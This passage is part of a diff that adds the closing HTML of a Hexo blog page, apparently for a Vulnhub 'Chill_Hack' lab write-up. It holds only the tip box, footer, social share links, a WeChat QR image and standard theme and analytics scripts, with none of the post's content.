+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/false" alt="打赏二维码">
+        </div>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/10/17/Chill_Hack/&title=《Vulnhub - Chill_Hack 靶场实战》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/10/17/Chill_Hack/&title=《Vulnhub - Chill_Hack 靶场实战》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/10/17/Chill_Hack/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Vulnhub - Chill_Hack 靶场实战》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/10/17/Chill_Hack/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/10/17/Chill_Hack/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACGUlEQVR42u3aQXLDIAwFUN//0ukBMkn/R0mnhsfKY7eG54Uiga4rHo+n8Xz/1d8n78z/azQwMDBuy3i8HWuMdtH5vC9nxMDAOIDxauJX1/nT929OPlPyBgwMDIz5dRvEMTAwMD4VcPNAvBasMTAwMNpiMt/j+te1OAYGxg0Z+a77319/5XwDAwPjVoxHOdpQuxYu61VhYGBszcgDXHtUmZS+SWFcrAcDA2NTRr7RNtk4a8va+vNhYGAcwJikg8mU7bFl3fCBgYFxGGMtpWubvdqY+csPBgYGxtaMtcdrpWkSRvO0dZT5YmBg3JaRTJnfaZst8jtXOw0GBsZGjPk2XF4S52Vtm4xiYGDsymgXlwTfNmiuHY5iYGCcxmhTwDykTg4vv16+YmBg/HtGe2A5P+acH2Re+eswMDC2YOThby1QzgN01GyBgYFxAGPtqCAPqfMNu2syMDAwtmOstT60YfobK8HAwDiHsXZ8mE/ZvnPUfoGBgbERY+1IoE3m2u6P+vNhYGAcwGjbvNqWiA/8DrxPEDEwMA5jrC13UldOyloMDIy9GY9yrH2ItZSxSCUxMDC2ZkyOM/OttLxYbcvXGoOBgXFbRl5qtglcG3bbgIuBgXEaY9JIMQ/BHyiDMTAwMMYtF22a2D7FwMDAyFO0tURwkm5iYGCcw2hbIvJitV3o2vYfBgbG3oy1Roe1UDtZxGQTEAMD47aMHy/eIuBWltbRAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
